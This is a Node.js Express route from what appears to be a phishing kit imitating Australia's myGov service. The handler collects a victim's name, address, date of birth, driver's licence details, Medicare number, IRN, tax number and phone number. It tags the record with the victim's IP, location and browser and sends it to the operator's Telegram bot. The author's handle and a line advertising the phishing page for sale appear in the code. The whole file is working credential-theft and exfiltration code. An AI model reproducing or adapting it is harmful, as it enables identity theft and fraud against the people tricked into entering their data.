// d-sn.js
const express = require('express');
const axios = require('axios');
const { apikey, chatid } = require('./config');

const router = express.Router();

// ---- helpers (identical to PHP) ----
function getBrowser(userAgent) {
  if (userAgent.includes('MSIE')) return 'Internet Explorer';
  if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
  if (userAgent.includes('Chrome')) return 'Google Chrome';
  if (userAgent.includes('Safari')) return 'Safari';
  if (userAgent.includes('Opera')) return 'Opera';
  return 'Unknown';
}

async function getLocation(ip) {
  try {
    const res = await axios.get(`https://freeipapi.com/api/json/${ip}`);
    return {
      country: res.data.countryName || 'Unknown',
      city: res.data.cityName || 'Unknown'
    };
  } catch {
    return { country: 'Unknown', city: 'Unknown' };
  }
}

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${apikey}/sendMessage`;
  try {
    await axios.post(url, { chat_id: chatid, text });
  } catch (err) {
    console.error('Telegram error:', err.message);
  }
}

// ---- route ----
router.all('/', async (req, res) => {
  if (req.method === 'POST') {
    const ip = req.ip || req.headers['x-forwarded-for'] || '0.0.0.0';
    const userAgent = req.headers['user-agent'] || '';
    const browser = getBrowser(userAgent);
    const location = await getLocation(ip);

    const aa = req.body.name || '';
    const bb = req.body.address || '';
    const cc = req.body.dob || '';
    const dd = req.body.dl || '';
    const ee = req.body.dlback || '';
    const ff = req.body.dlexp || '';
    const gg = req.body.medno || '';
    const hh = req.body.irn || '';
    const ii = req.body.taxno || '';
    const jj = req.body.phone || '';

    let message = '';
    message += "|++++++++++++|+ MyGov AU LOG +|+++++++++++|\n";
    message += "|Full Name: " + aa + "\n";
    message += "|Phone Number: " + jj + "\n";
    message += "|Address: " + bb + "\n";
    message += "|Date of Birth: " + cc + "\n";
    message += "|Driver's License: " + dd + "\n";
    message += "|Driver's License Backside: " + ee + "\n";
    message += "|Driver's License Expiry: " + ff + "\n";
    message += "|Medical Insurance Number: " + gg + "\n";
    message += "|Individual Reference Number: " + hh + "\n";
    message += "|Tax Number: " + ii + "\n";
    message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
    message += "|Client IP: " + ip + "\n";
    message += "|City : " + location.city + "\n";
    message += "|Browser : " + browser + "\n";
    message += "|Country : " + location.country + "\n";
    message += "|UserAgent : " + userAgent + "\n";
    message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
    message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";

    await sendToTelegram(message);
    res.status(200).send(); // empty response
  } else {
    res.json({ key: "For Page and Link Contact Telegram: @Mr0xBD" });
  }
});

module.exports = router;